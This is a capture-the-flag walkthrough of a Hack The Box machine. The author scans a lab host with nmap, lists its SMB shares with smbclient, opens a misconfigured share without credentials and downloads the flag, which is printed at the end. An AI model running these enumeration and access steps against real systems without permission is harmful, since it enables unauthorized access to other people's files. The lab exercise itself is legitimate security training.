# Hack The Box Machines: Fawn
Once the machine is spawn, let's scan de services and their versions running in the target machine with **nmap**.

```sh
❯ target=10.129.177.171
❯ nmap -sV $target
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-13 16:50 CEST
Nmap scan report for 10.129.177.171
Host is up (0.062s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.49 seconds
```

As seen the **445 TCP** port is opened and running, so there is a **share** where we can access, let's try it the script **smbclient**.

```sh
❯ smbclient -L $target
Enter WORKGROUP\gemonpar's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available

```

Once the command is executed, the target machine displays four shared folders, the first three needs admins privilegies while the **WorkShares** folder seems to be made for workflow. Let's try connect to that folder putting the same **password** as the current user **gemonpar** in the attack machine. This happens due to a missconfiguration in the **WorkShares** folder, allowing users without privilegies open that folder.

```sh
❯ smbclient \\\\$target\\WorkShares
Enter WORKGROUP\gemonpar's password: 
Try "help" to get a list of possible commands.
smb: \> 
```

As seen, the login is successful, so now lets see which commands are allowed the **help** command.

```sh
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> 
```
So if we make an **ls** we see two directories **Amy.J** and **James.P**, the **flag.txt** is in the James.P folder.

```sh
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

		5114111 blocks of size 4096. 1750989 blocks available
smb: \> ls Amy.J\
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

		5114111 blocks of size 4096. 1750989 blocks available
smb: \> ls James.P\
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1750989 blocks available
smb: \> get James.P\flag.txt 
getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
❯ cat James.P\\flag.txt
       │ File: James.P\flag.txt
   1   │ 5f61c10dffbc77a704d76016a22f1664
```

Finally there is the flag **5f61c10dffbc77a704d76016a22f1664**.
